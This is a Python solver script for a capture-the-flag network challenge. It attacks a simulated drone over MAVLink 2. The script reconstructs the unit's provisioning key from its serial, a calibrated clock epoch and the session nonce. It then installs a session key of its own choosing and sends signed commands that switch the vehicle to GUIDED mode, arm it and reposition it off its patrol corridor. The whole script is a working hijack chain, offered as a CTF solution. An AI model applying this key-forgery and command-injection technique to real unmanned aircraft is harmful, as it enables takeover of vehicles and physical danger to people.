#!/usr/bin/env python3
"""
CSCTF 2026 - grid-watch (Network, 900) - solver.

Chain:
  1. Recover the airframe serial from the capture's STATUSTEXT  -> CX-FALCON-9951
  2. Calibrate the airframe RTC from the capture: signing timestamps are 10us ticks
     since a per-unit commissioning epoch, with a per-unit ppm drift.
     Least squares over the 24 signed frames gives exactly epoch=1733965123, +17 ppm
     (both neighbours of each fail on all 24 frames, so it is uniquely pinned).
  3. prov_key = HKDF-SHA256(ikm = b"CX-FALCON-9951" || u64le(epoch),
                            salt = session nonce the unit announces at connect,
                            info = b"CX-PROV/v1", L = 32)
  4. SETUP_SIGNING signed with prov_key installs a session key we choose.
  5. Signed with that key: mode GUIDED -> arm -> MAV_CMD_DO_REPOSITION.
     The flag comes back from the accepted reposition.

Usage: python3 solve.py [host:port]
"""
import sys, os, re, struct, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'work'))
import mav2
from link import Link

HOST, PORT = 'w06.ctf.chronos-security.ro', 33089
if len(sys.argv) > 1:
    HOST, PORT = sys.argv[1].rsplit(':', 1); PORT = int(PORT)

SERIAL = b'CX-FALCON-9951'
EPOCH  = 1733965123          # commissioning epoch, seconds (calibrated, see work/verify_rtc.py)
PPM    = 17                  # RTC drift
NEWKEY = bytes(range(32))    # the session key we install

GUIDED = 4                   # ArduCopter custom mode (unit reports autopilot=ARDUPILOTMEGA)
MAV_CMD_DO_SET_MODE          = 176
MAV_CMD_COMPONENT_ARM_DISARM = 400
MAV_CMD_DO_REPOSITION        = 192
MAV_FRAME_GLOBAL_RELATIVE_ALT_INT = 6

# a point well off the LEA-220-VEST patrol corridor seen in the capture
TGT_LAT, TGT_LON, TGT_ALT = 45.5200000, 24.0300000, 60.0

flags = []
def watch(msgs):
    for msgid, pl, sig, f in msgs:
        if msgid == 253:
            t = pl[1:].rstrip(b'\x00').decode(errors='replace')
            print(f'    <- STATUSTEXT: {t}')
            flags.extend(re.findall(r'CSCTF\{[^}]*\}', t))
            m = re.search(r'PROV NONCE ([0-9a-fA-F]+)', t)
            if m: L.nonce_hex = m.group(1)
        elif msgid == 77:
            p = pl.ljust(10, b'\x00'); cmd, res = struct.unpack('<HB', p[:3])
            print(f'    <- COMMAND_ACK cmd={cmd} result={res} '
                  f'({"ACCEPTED" if res==0 else "not accepted"})')
    return msgs

print(f'[*] connecting to {HOST}:{PORT}')
L = Link(HOST, PORT)
watch(L.recv(3.0))
if not L.nonce_hex:
    sys.exit('[!] unit announced no provisioning nonce')
print(f'[*] session nonce      : {L.nonce_hex}')
print(f'[*] serial             : {SERIAL.decode()}')
print(f'[*] commissioning epoch: {EPOCH}  (RTC drift +{PPM} ppm)')

L.rtc = mav2.RTC(EPOCH, PPM)
print(f'[*] RTC check          : unit sigts={L.max_sigts}  our model={L.rtc.ticks(time.time())}  '
      f'delta={L.rtc.ticks(time.time())-L.max_sigts} ticks')

key = mav2.prov_key(SERIAL, EPOCH, bytes.fromhex(L.nonce_hex))
print(f'[*] prov_key           : {key.hex()}')

print('[1] SETUP_SIGNING (authenticated with prov_key)')
ts = L.next_ts()
mid, pl = mav2.msg_setup_signing(1, 1, NEWKEY, ts)
L.send(mid, pl, key=key, ts=ts)
watch(L.recv(2.5))

print('[2] DO_SET_MODE -> GUIDED')
mid, pl = mav2.msg_command_long(1, 1, MAV_CMD_DO_SET_MODE, 0, 1.0, float(GUIDED))
L.send(mid, pl, key=NEWKEY)
watch(L.recv(2.5))

print('[3] ARM')
mid, pl = mav2.msg_command_long(1, 1, MAV_CMD_COMPONENT_ARM_DISARM, 0, 1.0)
L.send(mid, pl, key=NEWKEY)
watch(L.recv(2.5))

print(f'[4] DO_REPOSITION -> {TGT_LAT}, {TGT_LON} @ {TGT_ALT} m')
mid, pl = mav2.msg_command_long(
    1, 1, MAV_CMD_DO_REPOSITION, 0,
    -1.0, 0.0, 0.0, 0.0, TGT_LAT, TGT_LON, TGT_ALT)
L.send(mid, pl, key=NEWKEY)
watch(L.recv(4.0))
watch(L.recv(3.0))
L.s.close()

print()
if flags:
    for f in dict.fromkeys(flags):
        print(f'FLAG: {f}')
else:
    print('[!] no flag seen')
